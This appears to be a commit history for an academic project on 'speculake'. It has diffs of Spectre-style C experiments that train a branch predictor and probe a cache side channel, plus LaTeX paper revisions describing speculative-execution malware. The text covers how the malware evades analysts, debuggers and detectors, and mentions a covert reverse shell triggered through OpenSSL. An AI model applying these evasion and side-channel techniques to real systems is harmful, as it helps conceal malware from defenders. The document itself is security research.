+of ``weird machine'' that takes advantage of speculative execution and uses a
 non-complicit trigger program to execute otherwise dead code.

### 2018-08-01 spectre_1/measure.c
registers, definitely speculates ~90% of the time, still no overflow/return. pretty much matches paper...

@@ -26,7 +26,7 @@ void end_target_fn(void);
  * e.g. 256 would be 1 byte of info Tradeoff here is larger bandwidth means 
  * we have to check more places in probe_buf (and flush them)
  */
-#define NUM_PROBES 1024
+//#define NUM_PROBES 256
 
 /*
  * These define the stride length we take between probes. This thwarts a 
@@ -99,13 +99,15 @@ void check_probes() {
 
 
 // Use Global instead of local for easier flushing?
-int __attribute__((section(".max_len"))) max_len = 43;
+uint64_t __attribute__((section(".max_len"))) max_len = 43;
 
-void branch(uint64_t* array, uint64_t entry, int index){
+
+void branch(register uint64_t entry, register uint64_t index){
+    uint64_t overflow[43];
     if (index < max_len){
-        asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
-        array[index] = entry;
-        return;
+        //asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
+        //target_fn();
+        overflow[index] = entry;
     }
     return;
 }
@@ -113,25 +115,24 @@ void branch(uint64_t* array, uint64_t entry, int index){
 void trick_branch(){
     int i=0;
     int training_rounds = 2000;
-    uint64_t overflow[43];
+    //uint64_t overflow[43];
     uint64_t good_val = 0xDEADBEEF12345678;
     uint64_t bad_val  = 0x0000000000434040;
 
     for (i=0; i< training_rounds; i++){
-        branch(overflow, good_val, i%43);
+        branch(good_val, i%43);
     }
-    
     _mm_clflush(&max_len);
     flush_probe_buf_i();
 
-    branch(overflow, bad_val, 49);
+    branch(bad_val, 44);
 }
 
 void measure() {
     int i, j;
 
     int misses = 0;
-    uint64_t k = 2;
+    uint64_t k = 1;
     uint64_t width = 8;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 
@@ -144,7 +145,10 @@ void measure() {
             // train_branch();
             // _mm_clflush(&max_len);
             trick_branch();
+            //target_fn();
+            //asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
             check_probes();
+            usleep(10);
         }
 
         uint64_t avg = 0;

### 2018-08-01 spectre_1/signal.h

@@ -16,7 +16,7 @@
 
 extern uint8_t* probe_buf;
 extern uint64_t cur_probe_space;
-#define NUM_PROBES 1024
+#define NUM_PROBES 256
 
 /*
  * Find the K items in results that have been hit the most often

### 2018-08-01 paper/related-work.tex
pass on A-C related work

@@
 \speculake shares many properties with \textit{weird machines}---a machine which
-take advantage of bugs or unexpected idiosyncracies in existing systems to
+takes advantage of bugs or unexpected idiosyncracies in existing systems to
 perform arbitrary
@@
 Unexpected functionality such as instruction-less computing enables the
-demonstration of a Turing complete weird machine by taking advantage of memory
-translation tables, page-faults, and hardware exception handling to effectively
-compute arithmetic and logical operations without the processor executing any
-instructions~\cite{bangert2013page}.
+demonstration of a Turing complete ``weird machine'' by taking advantage of
+memory translation tables, page-faults, and hardware exception handling to
+effectively compute arithmetic and logical operations without the processor
+executing any instructions~\cite{bangert2013page}.
 
@@
 
-Previous ``weird machines'' have demonstrated the capability to execute
-potentially malicious code in an unexpected manner, and \speculake is a new type
-of ``weird machine'' that takes advantage of speculative execution and uses a
-non-complicit trigger program to execute otherwise dead code.
+\speculake is a new type of ``weird machine'' that takes advantage of
+speculative execution and uses a non-complicit trigger program to execute
+otherwise dead code. While previous ``weird machines'' have demonstrated the
+capability to execute potentially malicious code in an unexpected manner, we are
+the first to exploit speculative execution in order to execute arbitrary
+instructions.
 
@@
 Hardware minutia have also been used to identify and fingerprint execution
-environments---in malware this is know as a red-pill~\cite{red-pill} and is
+environments---in malware this is known as a red-pill~\cite{red-pill} and is
 typically used by malware to detect when it is under emulation or a debugging
 environment~\cite{lindorfer2011detecting, balzarotti2010efficient,
-paleari2009fistful}
+paleari2009fistful} attempting to circumvent malware detectors.
 
-% Hardware bare-metal analysis
-
+To address red-pills, systems often employ measures to detect them.
 ``Bare-metal'' emulation of malware~\cite{kirat2011barebox}, methods to
 determine if malware is performing red-pill checks to avoid emulation
-environments~\cite{kirat2014barecloud}, and symbolic execution can also be used
-to combat red-pills by finding environmental triggers in malicious
+environments~\cite{kirat2014barecloud}, and symbolic execution can be used to
+combat red-pills by finding environmental triggers in malicious
 binaries~\cite{schwartz2010all}.
 
-Unlike other red-pills, \speculake confounds analysts and red-pill detectors
-with the use a trigger program and speculative execution. The use of a separate
-and benign trigger program controlled by the adversary enables the \speculake
-malware to limit detection capabilities. Additionally, as \speculake is executed
-via speculative execution, the instructions executed and speculative state are 
-also obscured from analysts.
+\speculake undertakes to avoid detection, and is a new class of red-pill. Unlike
+previous red-pills, \speculake complicates analysis and impedes red-pill
+detectors with the use a trigger program and speculative execution. The use of a
+separate and seemingly benign trigger program influenced by the adversary
+enables the \speculake malware to limit detection by acting benign until
+triggered to influence the branch predictor. Additionally, as an \speculake
+attack is carried out via speculative execution, the instructions executed and
+speculative state are not committed to by the processor and are thus obscured
+from analysts.
 
-Similarly, debugging break-points will not enable analysts to debug \speculake
-malware as break-points interrupt the control flow of a program and prevent
-speculative execution. Symbolic execution will also fail to find the speculative
-gadgets as it is never on the execution pathway. This allows \speculake to
-effectively act as a red-pill while avoiding detection as such.
+Similarly, break-points (and other debugging techniques) will not aid in
+unravelling \speculake malware as break-points interrupt the control flow of a
+program and prevent speculative execution. Symbolic execution will also fail to
+find the speculative gadgets as they are never on the (committed) execution
+pathway. This allows \speculake to effectively act as a red-pill while avoiding
+detection as such.
 
@@
 use the branch predictor side-channel as a \emph{covert
-channel}~\cite{lampson1973note} between an innocent victim program and malware.
+channel}~\cite{lampson1973note} between an innocent trigger program and malware.
 This allows \speculake to use the leaked information from cache as a message to
-a colluding malware to make decisions.
+the malware in order to influence speculative execution pathways.
 
@@
 
-The branch predictor has been used as a covert
+The branch predictor has also been used as a covert
 channel~\cite{evtyushkin2016understanding}. Previous work has examined the
@@
 
-\speculake takes advantage of a cache side-channel in \texttt{OpenSSL} and uses
+\speculake exemplifies a new covert channel using the branch predictor in which
+only one side of the channel is nefarious and the other is innocent. \speculake
+takes advantage of a branch predictor side-channel in \texttt{OpenSSL} and uses
 it as a covert channel. \texttt{OpenSSL} is not a malicious colluding program in
-this case but rather a program leaking information on which cipher suite has
-been selected by attackers, allowing us to use the branch predictor as an
-attacker controlled covert channel of an innocent victim program.
+this case but rather a program whose execution pathway can be influenced by
+attackers based on selected cipher suites. This allows malware to use the branch
+predictor as an attacker controlled covert channel between an unsuspecting
+trigger program and \speculake malware.
 

### 2018-08-01 paper/related-work.tex
working on flow

@@
 
-Previous examples of ``weird machines'' include traditional vulnerabilities such
-as buffer overflows, format string exploits and return-to-libc attacks without
-function calls~\cite{buffer_overflow, format_string_exploit,
-shacham2007geometry}.
-
-Unexpected functionality such as instruction-less computing enables the
-demonstration of a Turing complete ``weird machine'' by taking advantage of
-memory translation tables, page-faults, and hardware exception handling to
-effectively compute arithmetic and logical operations without the processor
-executing any instructions~\cite{bangert2013page}.
-
-Features in modern processors such as multiple threads sharing system resources
-and optimizations done across the process isolation boundary leads to
-opportunities for ``weird machines''~\cite{d2015exploiting}.
+Recently there has been a trend of features in modern processors such as
+multiple threads sharing system resources and optimizations done across the
+process isolation boundary which lead to opportunities for ``weird
+machines''~\cite{d2015exploiting}. In particular, previous examples of ``weird
+machines'' include traditional vulnerabilities such as buffer overflows, format
+string exploits and return-to-libc attacks without function
+calls~\cite{buffer_overflow, format_string_exploit, shacham2007geometry}.
+Additionally, unexpected functionality such as instruction-less computing
+enables the demonstration of a Turing complete ``weird machine'' by taking
+advantage of memory translation tables, page-faults, and hardware exception
+handling to effectively compute arithmetic and logical operations without the
+processor executing any instructions~\cite{bangert2013page}.
 
@@
 environment~\cite{lindorfer2011detecting, balzarotti2010efficient,
-paleari2009fistful} attempting to circumvent malware detectors.
-
-To address red-pills, systems often employ measures to detect them.
-``Bare-metal'' emulation of malware~\cite{kirat2011barebox}, methods to
-determine if malware is performing red-pill checks to avoid emulation
+paleari2009fistful} attempting to circumvent malware detectors. To address
+red-pills, systems often employ measures to detect them. ``Bare-metal''
+emulation of malware~\cite{kirat2011barebox}, methods to determine if malware is
+performing red-pill checks to avoid emulation
 environments~\cite{kirat2014barecloud}, and symbolic execution can be used to
@@
 
-\speculake undertakes to avoid detection, and is a new class of red-pill. Unlike
-previous red-pills, \speculake complicates analysis and impedes red-pill
-detectors with the use a trigger program and speculative execution. The use of a
-separate and seemingly benign trigger program influenced by the adversary
-enables the \speculake malware to limit detection by acting benign until
-triggered to influence the branch predictor. Additionally, as an \speculake
-attack is carried out via speculative execution, the instructions executed and
-speculative state are not committed to by the processor and are thus obscured
-from analysts.
+Analogously, \speculake undertakes to avoid detection. Unlike previous
+red-pills, \speculake complicates analysis and impedes malware detectors with
+the use a trigger program and speculative execution. The use of a separate and
+seemingly benign trigger program influenced by the adversary enables the
+\speculake malware to limit detection by acting benign until triggered to
+influence the branch predictor (while still appearing innocuous).
 
-Similarly, break-points (and other debugging techniques) will not aid in
-unravelling \speculake malware as break-points interrupt the control flow of a
-program and prevent speculative execution. Symbolic execution will also fail to
-find the speculative gadgets as they are never on the (committed) execution
-pathway. This allows \speculake to effectively act as a red-pill while avoiding
-detection as such.
+Additionally, as an \speculake attack is carried out via speculative execution,
+the instructions executed and speculative state are not committed to by the
+processor and are thus obscured from analysts. Similarly, symbolic execution
+will fail to find the speculative gadgets as they are never on the (committed)
+execution pathway. More direct analysis such as with break-points (and other
+debugging techniques) will not aid in unravelling \speculake malware as
+break-points interrupt the control flow of a program and prevent speculative
+execution. This allows \speculake to effectively act as a red-pill while
+avoiding detection as such.
 
@@
 
-The branch predictor has also been used as a covert
-channel~\cite{evtyushkin2016understanding}. Previous work has examined the
-capability of two colluding programs to share sensitive information between each
-other using the branch predictor by timing how long a spy process executes taken
-(not-taken) branches~\cite{evtyushkin2015covert}.
+\speculake uses the branch predictor as a covert channel. The branch predictor
+has been considered as a covert channel
+before~\cite{evtyushkin2016understanding}. For example, the branch predictor can
+be used by two colluding programs to share sensitive information between each
+other by timing how long a spy process executes taken (not-taken)
+branches~\cite{evtyushkin2015covert}.
 
-\speculake exemplifies a new covert channel using the branch predictor in which
-only one side of the channel is nefarious and the other is innocent. \speculake
-takes advantage of a branch predictor side-channel in \texttt{OpenSSL} and uses
-it as a covert channel. \texttt{OpenSSL} is not a malicious colluding program in
-this case but rather a program whose execution pathway can be influenced by
-attackers based on selected cipher suites. This allows malware to use the branch
-predictor as an attacker controlled covert channel between an unsuspecting
-trigger program and \speculake malware.
+While the branch predictor has been used as a covert channel between two
+colluding malicious programs, \speculake exemplifies a new covert channel using
+the branch predictor in which only one side of the channel is nefarious and the
+other is innocent. \speculake takes advantage of a branch predictor side-channel
+in \texttt{OpenSSL} and uses it as a covert channel. \texttt{OpenSSL} is not a
+malicious colluding program in this case but rather a program whose execution
+pathway can be influenced by attackers based on selected cipher suites. This
+allows malware to use the branch predictor as an attacker controlled covert
+channel between an unsuspecting trigger program and \speculake malware.
 

### 2018-08-01 spectre_1/measure.c
Added min value overflow in opposite direction -- still doesn't work

@@ -100,11 +100,12 @@ void check_probes() {
 
 // Use Global instead of local for easier flushing?
 int __attribute__((section(".max_len"))) max_len = 43;
+int __attribute__((section(".max_len"))) min_len = 0;
 
-void branch(uint64_t* array, uint64_t entry, int index){
-    if (index < max_len){
-        asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
+void branch(uint64_t* array, register entry, register index){
+    if ((index < max_len) && (index >= min_len)) {
         array[index] = entry;
+        asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
         return;
     }
     return;
@@ -117,14 +118,17 @@ void trick_branch(){
     uint64_t good_val = 0xDEADBEEF12345678;
     uint64_t bad_val  = 0x0000000000434040;
 
+    // memset(overflow, 0x44, sizeof(overflow));
     for (i=0; i< training_rounds; i++){
         branch(overflow, good_val, i%43);
     }
-    
+     
     _mm_clflush(&max_len);
+    _mm_clflush(&min_len);
     flush_probe_buf_i();
 
-    branch(overflow, bad_val, 49);
+    branch(overflow, bad_val, -1);
+    // branch(overflow, bad_val, 49);
 }
 
 void measure() {

### 2018-08-01 spectre_1/target_fn.c

@@ -16,19 +16,7 @@ extern uint8_t turing_state;
 void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void)
 {
-    //printf("target_fn\n");
-    asm volatile (
-        //".rept 0x6; nop; .endr\n"
-    "target_fn_start:"
-
-        ".rept 32\n"
-        __signal(0x11)
-        //"nop;nop;nop;nop;nop;nop\n" // cover (pop %rax; call 1f;)
-
-        ".endr\n"
-        :::"rax", "rcx", "rdx");
-
-    //asm volatile ("pop %%rbp\npush $0x0400892\nretq\n":::);
+    asm volatile ( __signal(0x11) :::"rax", "rcx", "rdx");
 }
 
 void end_target_fn(void) __attribute__((section(".targetfn")));

### 2018-08-01 paper/related-work.tex
pass on speculative execution subsection of related work

@@
 
-% Lead in 
-Leading up to the discovery and release of the Spectre and Meltdown
-vulnerabilities multiple teams were working to reverse engineer the mechanisms
-that implemented in the microcode of various processors and document their
-behavior~\cite{intel-instruction-tables,project_zero,measuring-cache,measuring-rob}.
-Research into branch predictors~\cite{godbolt2016branch}, cache replacement
-policies, and reorder buffer construction~\cite{measuring-rob} paved the way for
-the branch prediction side-channels employed by Spectre (and subsequently
-\speculake).
-%Efforts to examine cache and memory security also preempted the Spectre work, 
-%including Sophia D'Antoine's thesis work developing a side channel based on 
-%instruction interleaving in the CPU~\cite{d2015exploiting}. Similar research into branch 
-%predictors, cache replacement policies, and reorder buffer construction including work by Matt 
-%Godbolt~\cite{godbolt2016branch}, and Henry Wong~\cite{measuring-rob} paved the runway for 
-%dedicated branch prodiction side-channels.
-
-% Discovery & Followup
-Given the numerous directions that were being investigated in reverse
-engineering Intel processors, multiple teams discovered the Spectre
-vulnerabilities concurrently~\cite{spectre, project_zero, evtyushkin2018branchscope, maisuradze2018speculose}.
-%These works propose multiple variants making use of branch prediction.
-Follow 
-up work on speculative execution side channels has also demonstrated
-web-based vulnerabilites~\cite{genkin2018drive} as well as hardware isolation  
-leaks in Intel's SGX~\cite{spectre_sgx}. At the time of writing multiple sources
-have claimed new speculative execution related exploits termed \textit{Spectre-NG}
-have been reported to Intel and assigned CVE numbers, though details are
-not yet available~\cite{spectre_ng_gossip}.
-%We have no details
-%on content, though Intel has labeled four as critical and another four 
-%as intermediate security flaws~\cite{spectre_ng_gossip}.
-
-% defenses
-
-%Much like cache side channel vulnerabilities speculative execution is relatively
-%critical to processor performance and requires significant software and hardware 
-%updates to fully address. 
-% Multiple measures have been proposed to combat the 
-% individual variants of Spectre.
-
-% One popular approach uses compiler level software patches to wrap sensitive 
-% function calls. Retpoline replaces indirect jumps with \texttt{retq}
-% instructions that read from the cached stack (and are thus less likely to be
-% mis-speculated)~\cite{retpoline}.
-% Gruss~\textit{et al.} propose the KAISER software patch to enforce address space
-% isolation for kernel and user space proceses~\cite{gruss2017kaslr}. 
-% Other proposals have considered hypervisor enforced time domain separation at varying 
-% granularity~\cite{renau2018securing}, and fuzzy clocks that would reduce the accuracy 
-% of any time based exfiltration pathway~\cite{hu1992reducing}. However, none of these defenses
-% fundamentally defeat the use of a branch predictor as a cooperative mechanism
-% spanning multiple processes. Intel has released microarchitecture updates for
-% its most recent CPUs, but older architectures do not support these updates and
-% will remain vulnerable~\cite{intel-micro-patch}.
-
-% Trippel~\textit{et al.} proposes a method of faithfully simulating hardware
-% bugs, given a formal model specifying the
-% microarchitecture~\cite{trippel2018meltdownprime}. However, such models are
-% unlikely to be released by CPU manufacturers, as they generally involve
-% closely-guarded trade secrets, making this a less accessible solution for the
-% research community.
-
-%\smallskip
-%
-%We can certainly look forward to more vulnerabilities relating to speculative 
-%branching and related hardware side channels. Our work represents an exploit 
-%model for these vulnerabilities reliant upon shared hardware resources.
-
-%%%%%%%%%%%%%%
+\speculake builds on Spectre~\cite{spectre} and Meltdown~\cite{meltdown} which
+leverage speculative execution to leak sensitive information to unprivileged
+processes.  Others have built on Spectre and Meltdown to demonstrate web-based
+vulnerabilities~\cite{genkin2018drive, schwarz2018netspectre} as well as
+hardware isolation leaks in Intel's SGX~\cite{spectre_sgx,chen2018sgxpectre}.
+The branch predictor has also been examined~\cite{evtyushkin2018branchscope} in
+the light of Spectre but only as side-channel which is leaking information.
+\speculake likewise takes advantage of speculative execution however it does so
+to attain hidden arbitrary computation. We believe that \speculake can leverage
+these advances in speculative execution malware as well.

### 2018-08-02 paper/implementation.tex
remove figure 5

@@
 
-\FigTuringSuccess
-
 We implemented a 2-symbol 5-state Busy Beaver Turing machine logic in a  
@@
 
-Our implementation is able to examine the state and current symbol
-on the Turing tape and make decisions based on these values as long as they are
-in cache. If one of these becomes uncached, one of two things will happen.
-First, the speculative gadget may simply fail to report any result back to the
-real world, as the uncached read takes too long to return before the speculative
-world is squashed by the resolution of the function pointer. Second, the CPU may
-\emph{speculate} on the value of the uncached item, which may be incorrect. Of
-course, this does not affect the correctness of normal programs, but it does
-impact the correctness of our speculative code. In particular, the speculative
-gadget will compute using an incorrect value of state or current
+Our implementation is able to examine the state and current symbol on the Turing
+tape and make decisions (in the speculative world) based on these values as long
+as they are in cache. If one of these becomes uncached, one of two things will
+happen. First, the speculative gadget may simply fail to report any result back
+to the real world, as the uncached read takes too long to return before the
+speculative world is squashed by the resolution of the function pointer. Second,
+the CPU may \emph{speculate} on the value of the uncached item, which may be
+incorrect. Of course, this does not affect the correctness of normal programs,
+but it does impact the correctness of our speculative code. In particular, the
+speculative gadget will compute using an incorrect value of state or current
 symbol, and ultimately report the wrong update.
@@
 
-In order to have confidence the speculative gadget executed with the
-correct inputs and reported the computed result correctly, 
-we repeat the execution a number of times and look for the value that was
-detected as present in the cache most often over all the iterations.
-
-Our Turing implementation discovered that 10 repetitions is sufficient for the
-real world to determine the correct value, as the ``hit rate'' for any one
-iteration observing the correct value loaded in cache was over 80\%.
-
 We implemented the 5 state Busy Beaver configuration which requires over 47
-million steps to complete. Figure~\ref{fig:turing_success} shows the
-capabilities of our Turing implementation. We were able to verify that the
-speculative world could correctly compute a million instructions with no errors
-at a rate of 324 instructions per second.
+million steps to complete. In order to have confidence the speculative gadget
+executed with the correct inputs and reported the computed result correctly, we
+repeat the execution a number of times and look for the value that was detected
+as present in the cache most often over all the iterations. We measured the
+error rate of our implementation as a function of how many redundant iterations
+of the same step. Our Turing implementation discovered that 10 repetitions is
+sufficient for the real world to determine the correct value, as the ``hit
+rate'' for any one iteration observing the correct value loaded in cache was
+over 80\%. Additionally we found that the speculative world could correctly
+compute a million instructions with no errors at a rate of 324 instructions per
+second.
 

### 2018-08-02 paper/discussion.tex
move redpils to discussion

@@
 utilization of the system.
+
+\paragraph{Red-Pills}
+Hardware minutia have also been used to identify and fingerprint execution
+environments---in malware this is known as a red-pill~\cite{red-pill} and is
+typically used by malware to detect when it is under emulation or a debugging
+environment~\cite{lindorfer2011detecting, balzarotti2010efficient,
+paleari2009fistful} attempting to circumvent malware detectors. To address
+red-pills, systems often employ measures to detect them. ``Bare-metal''
+emulation of malware~\cite{kirat2011barebox}, methods to determine if malware is
+performing red-pill checks to avoid emulation
+environments~\cite{kirat2014barecloud}, and symbolic execution can be used to
+combat red-pills by finding environmental triggers in malicious
+binaries~\cite{schwartz2010all}.
+
+Analogously, \speculake undertakes to avoid detection. Unlike previous
+red-pills, \speculake complicates analysis and impedes malware detectors with
+the use a trigger program and speculative execution. The use of a separate and
+seemingly benign trigger program influenced by the adversary enables the
+\speculake malware to limit detection by acting benign until triggered to
+influence the branch predictor (while still appearing innocuous).
+
+Additionally, as an \speculake attack is carried out via speculative execution,
+the instructions executed and speculative state are not committed to by the
+processor and are thus obscured from analysts. Similarly, symbolic execution
+will fail to find the speculative gadgets as they are never on the (committed)
+execution pathway. More direct analysis such as with break-points (and other
+debugging techniques) will not aid in unravelling \speculake malware as
+break-points interrupt the control flow of a program and prevent speculative
+execution. This allows \speculake to effectively act as a red-pill while
+avoiding detection as such. Suggesting that significant work would be required
+to adapt current red-pill detectors to detect \speculake malware.
 

### 2018-08-02 paper/abstract.tex
abstract/intro pass

@@
 We study the extent and types of execution that can be performed
-speculatively, and build tools that enable several computations to be
+speculatively, and demonstrate several computations that can be
 performed covertly. In particular, within speculative execution we are able to
-decrypt memory using AES-NI instructions, and are able to interpret a custom
-virtual machine language to perform arbitrary computation.
-We also show how the trigger program
+decrypt memory using AES-NI instructions at over 5~kbps. Building on this, we
+are additionally able to decrypt and interpret
+a custom virtual machine language to perform arbitrary computation,
+allowing us to create a covert dial-back shell that executes in a few
+milliseconds. We also show how our corresponding trigger program
 can be a pre-existing benign application already running on the system, and
-demonstrate this concept with OpenSSL driven remotely by the attacker as our
+demonstrate this concept with OpenSSL driven remotely by the attacker as a
 trigger program.

### 2018-08-02 paper/introduction.tex
abstract/intro pass

@@
 the kernel~\cite{meltdown}. Both of these vulnerabilities focus on extracting
-secret data from a process or operating system.
+secret data from a process or operating system. Recent follow-up work has
+revealed other Spectre ``variants'',  including speculative buffer
+overflows, speculative store bypass, and using alternative side channels besides
+the cache~\cite{spectre1-1,spectre3}. In addition, several attacks have
+leveraged Spectre to attack Intel's SGX~\cite{sgx-spectre,foreshadow}, and
+perform remote leakage attacks~\cite{netspectre}.
 
@@
 \speculake provides a new technique to malware authors, allowing them to hide
-program functionality in code that does not execute at runtime.
+program functionality in code that appears to not execute at runtime. This technique
+defeats existing static and dynamic analysis, making it especially difficult for
+malware analysts to determine what a binary will do.
 
@@
 trigger program. When run by itself, the payload program executes a pattern of
-indirect jumps and measures a cache side channel. While the trigger program is
-not running, the payload program is effectively inactive (and may optionally do
-some decoy operation). When the trigger program runs, it executes a similar
+indirect jumps and measures a cache-based side channel\footnote{We note that other
+side channels could be used in place of a cache}. While the trigger program is
+not running, the payload program is effectively inactive (potentially performing
+a decoy operation). When the trigger program runs, it executes a similar
 pattern of indirect jumps (with similar source and destination addresses as the
 payload program), effectively training the CPU's branch predictor to the jump
-pattern specified by the trigger program.
+pattern performed by the trigger program.
 
@@
 computation, and can communicate results back to the ``real world'' payload 
-program via a cache side channel.
+program via a side channel.
 
@@
 components of the target CPU, including the branch predictor, cache hierarchy,
-out-of-order execution, and hyperthreading. In contrast, the \speculake
+out-of-order execution, and hyperthreading, as well as taking into account the
+operating system's process scheduling algorithm. In contrast, the \speculake
 author only has to use a partial model of these components and produce binaries
 that take advantage of them, while the analyst's model must be complete to
-capture all potential \speculake uses. Second, the analyst must run all
+capture all potential \speculake variants. Second, the analyst must run all
 potential trigger programs through the simulator, including benign programs with
-realistic inputs. Both of these contribute to a time-consuming and expensive
-endeavor for would-be analysts.
+real-world inputs. Both of these contribute to a time-consuming and expensive
+endeavor for would-be analysts, giving the attacker a significant advantage.
 
@@
 allows us to execute between 100 and 200 instructions speculatively on modern
-Intel CPUs. While brief, we are able to perform execution in short steps,
+Intel CPUs. While brief, we show how to perform execution in short steps,
 communicating intermediate results back to the ``real world'' part of the
@@
 Using these building blocks, we demonstrate the practicality of hiding arbitrary
-computation by implementing a reverse shell in our speculative instruction set.
+computation by implementing a reverse shell in our speculative instruction set,
+with instructions decrypted in the speculative world.
 We show that this simple payload is able to perform several system calls in a

### 2018-08-02 paper/discussion.tex

@@
 combat red-pills by finding environmental triggers in malicious
-binaries~\cite{schwartz2010all}.
+binaries~\cite{schwartz2010all}. Similar sand-boxing techniques may be applied
+to detect \speculake malware.
 
-Analogously, \speculake undertakes to avoid detection. Unlike previous
-red-pills, \speculake complicates analysis and impedes malware detectors with
-the use a trigger program and speculative execution. The use of a separate and
-seemingly benign trigger program influenced by the adversary enables the
+Unlike red-pills, \speculake complicates analysis and impedes malware detectors
+with the use a trigger program and speculative execution. The use of a separate
+and seemingly benign trigger program influenced by the adversary enables the
 \speculake malware to limit detection by acting benign until triggered to
@@
 will fail to find the speculative gadgets as they are never on the (committed)
-execution pathway. More direct analysis such as with break-points (and other
+execution pathway.
+
+Furthermore, direct analysis such as with break-points (and other
 debugging techniques) will not aid in unravelling \speculake malware as

### 2018-08-02 paper/related-work.tex

@@
 instructions.
-
-\subsection{Red-Pills}
-Hardware minutia have also been used to identify and fingerprint execution
-environments---in malware this is known as a red-pill~\cite{red-pill} and is
-typically used by malware to detect when it is under emulation or a debugging
-environment~\cite{lindorfer2011detecting, balzarotti2010efficient,
-paleari2009fistful} attempting to circumvent malware detectors. To address
-red-pills, systems often employ measures to detect them. ``Bare-metal''
-emulation of malware~\cite{kirat2011barebox}, methods to determine if malware is
-performing red-pill checks to avoid emulation
-environments~\cite{kirat2014barecloud}, and symbolic execution can be used to
-combat red-pills by finding environmental triggers in malicious
-binaries~\cite{schwartz2010all}.
-
-Analogously, \speculake undertakes to avoid detection. Unlike previous
-red-pills, \speculake complicates analysis and impedes malware detectors with
-the use a trigger program and speculative execution. The use of a separate and
-seemingly benign trigger program influenced by the adversary enables the
-\speculake malware to limit detection by acting benign until triggered to
-influence the branch predictor (while still appearing innocuous).
-
-Additionally, as an \speculake attack is carried out via speculative execution,
-the instructions executed and speculative state are not committed to by the
-processor and are thus obscured from analysts. Similarly, symbolic execution
-will fail to find the speculative gadgets as they are never on the (committed)
-execution pathway. More direct analysis such as with break-points (and other
-debugging techniques) will not aid in unravelling \speculake malware as
-break-points interrupt the control flow of a program and prevent speculative
-execution. This allows \speculake to effectively act as a red-pill while
-avoiding detection as such.
 

### 2018-08-02 paper/architecture.tex
fix arch refs

@@
 existing anti-virus
-systems~\cite{jana2012abusing,oberheide2009polypack,ropinjector,swinnen2014one}.
+systems~\cite{jana2012abusing,oberheide2009polypack,ropinjector,swinnen2014one,ugarte2015sok}.
 

### 2018-08-02 paper/background.tex
fix arch refs

@@
 continue executing straight through depending on the state of the CPU (e.g. condition
-registers). While there are only two potential statically-known targets for a direct
+registers). While there are only two statically-known targets for a direct
 branch, the CPU may not know if the branch is taken or not until preceding

### 2018-08-02 paper/introduction.tex
fix existing references

@@
 
-Previously, it was assumed that speculative execution results
-remain invisible if discarded, as careful CPU design maintains strict separation
-between speculative results and updates to architectual state.
-However, recent research has revealed side channels that violate this
-separation, and researchers have demonstrated ways to exfiltrate results from speculative
-computation. Most notably, the Spectre vulnerability allows attackers to leak
-information from purposefully mis-speculated branches in a victim
-process~\cite{spectre}. The Meltdown vulnerability uses speculative results of an
-unauthorized memory read to sidestep page faults and leak protected memory from
-the kernel~\cite{meltdown}. Both of these vulnerabilities focus on extracting
-secret data from a process or operating system. Recent follow-up work has
-revealed other Spectre ``variants'',  including speculative buffer
-overflows, speculative store bypass, and using alternative side channels besides
-the cache~\cite{spectre1-1,spectre3}. In addition, several attacks have
-leveraged Spectre to attack Intel's SGX~\cite{sgx-spectre,foreshadow}, and
-perform remote leakage attacks~\cite{netspectre}.
+Previously, it was assumed that speculative execution results remain invisible
+if discarded, as careful CPU design maintains strict separation between
+speculative results and updates to architectual state. However, recent research
+has revealed side channels that violate this separation, and researchers have
+demonstrated ways to exfiltrate results from speculative computation. Most
+notably, the Spectre vulnerability allows attackers to leak information from
+purposefully mis-speculated branches in a victim process~\cite{spectre}. The
+Meltdown vulnerability uses speculative results of an unauthorized memory read
+to sidestep page faults and leak protected memory from the
+kernel~\cite{meltdown}. Both of these vulnerabilities focus on extracting secret
+data from a process or operating system. Recent follow-up work has revealed
+other Spectre ``variants'',  including speculative buffer overflows, speculative
+store bypass, and using alternative side channels besides the
+cache~\cite{kiriansky2018speculative,spectre3}. In addition, several attacks
+have leveraged Spectre to attack Intel's SGX~\cite{chen2018sgxpectre,
+spectre_sgx, foreshadow}, and perform remote leakage
+attacks~\cite{schwarz2018netspectre}.
 

### 2018-08-02 paper/abstract.tex
preliminary discussion update

@@
 predictor, causing the payload program to \emph{speculatively} execute code, and
-communicating its results back to the rest of the payload program, changing its
+communicating its results back to the rest of the payload program, changes its
 behavior.

### 2018-08-02 paper/architecture.tex
preliminary discussion update

@@
 trigger or payload program to coerce the OS scheduler to assign a
-payload/trigger pair to the same core.
+payload/trigger pair to the same core. We note that this is not a strict requirement
+for the attacker as most OS schedulers will use round robin algrithms to assign 
+tasks to processors -- eventually the trigger and payload will execute co-resident
+on a single core.
 
@@
 channels invisible to the analyst. As with typical malware, the analyst may
-attempt to reverse engineer the trigger to revela the malware's behavior, but we
+attempt to reverse engineer the trigger to reveal the malware's behavior, but we
 will show (in Section~\ref{subsec:nested-spec}) how to defeat this type of
@@
 an i5-4300U, % ewust laptop
-and an i5-4590. % ewust desktop
+an i5-4590, % ewust desktop
+and an Epyc 7251.
 % For simplicity, we report results from only the Xeon-1270.
@@
 \subsubsection{Hyperthreading}
+\label{sssec:hyperthread}
 
@@
 running trigger and payload on a single core vs.\ a pair of hyperthreaded cores.
+
+We note that Single Thread Indirect Branch Predictors (STIBP) have been implemented
+in most environments to prevent cross thread branch predictor interference.
+While this does remove the \speculake trigger's influence in scenarios where a
+process runs on an isolated cpu, in most modern environments
+tasks are scheduled to all available processors. This means that the trigger and
+payload will be coresident eventually, allowing progress to continue.
 

### 2018-08-02 paper/architecture.tex
arch pass

--- 2018-08-02 paper/architecture.tex
@@
 the malware, for example by observing control flow within the malware and using
-adaptive fuzzers~\cite{afl} to generate inputs that explore other execution
+adaptive fuzzers~\cite{afl,stephens2016driller} to generate inputs that explore other execution
 paths of the binary. In contrast, \speculake malware's trigger depends on
 behavior in seemingly unrelated binaries, influencing malware behavior through
-channels invisible to the analyst. As with typical malware, the analyst may
-attempt to reverse engineer the trigger to revela the malware's behavior, but we
+channels that are effectively invisible to the analyst. As with typical malware, the analyst may
+attempt to reverse engineer the trigger to reveal the malware's behavior, but we
 will show (in Section~\ref{subsec:nested-spec}) how to defeat this type of
@@
 branch in the payload program, causing it to speculatively execute 
-instructions that are never truly executed. We term this speculative destination
